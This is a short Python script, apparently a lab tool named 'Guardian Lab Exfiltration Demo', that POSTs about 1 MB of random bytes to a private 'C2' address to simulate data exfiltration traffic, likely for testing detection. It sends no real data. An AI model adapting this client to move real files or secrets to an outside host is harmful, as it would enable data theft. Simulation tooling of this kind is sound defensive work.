"""Exfiltration demo client: sends large outbound payload to lab C2."""
from __future__ import annotations

import argparse
import os
import socket
import sys
import time


def run_exfil(target_host: str = "10.77.0.2", target_port: int = 443, size_kb: int = 1024) -> None:
    print(f"[*] Starting exfiltration demo: uploading {size_kb} KB to {target_host}:{target_port}...")
    total_bytes = size_kb * 1024
    payload = os.urandom(total_bytes)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5.0)
    try:
        s.connect((target_host, target_port))
        # Send HTTP POST with data payload
        header = (
            f"POST /upload HTTP/1.1\r\n"
            f"Host: {target_host}\r\n"
            f"Content-Length: {len(payload)}\r\n"
            f"Content-Type: application/octet-stream\r\n\r\n"
        ).encode("ascii")
        s.sendall(header + payload)
        print(f"[✓] Uploaded {len(payload):,} bytes to {target_host}:{target_port}")
    except Exception as ex:
        print(f"[-] Exfiltration failed: {ex}")
    finally:
        s.close()


def main() -> None:
    parser = argparse.ArgumentParser(description="Guardian Lab Exfiltration Demo")
    parser.add_argument("--host", default="10.77.0.2")
    parser.add_argument("--port", type=int, default=443)
    parser.add_argument("--kb", type=int, default=1024)
    args = parser.parse_args()

    run_exfil(target_host=args.host, target_port=args.port, size_kb=args.kb)


if __name__ == "__main__":
    main()
